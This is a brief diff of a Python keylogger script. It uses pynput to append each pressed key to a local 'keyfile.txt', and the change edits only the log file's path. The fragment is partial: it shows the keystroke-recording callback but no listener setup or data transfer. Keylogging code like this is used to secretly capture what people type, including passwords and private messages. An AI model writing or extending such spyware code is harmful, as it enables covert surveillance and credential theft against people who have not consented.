@@ -1,7 +1,7 @@
 from pynput import keyboard
 
 def keyPressed(key):
-    with open("../../../../keyfile.txt", 'a') as logKey:
+    with open("keyfile.txt", 'a') as logKey:
         try:
             char = key.char
             logKey.write(char)
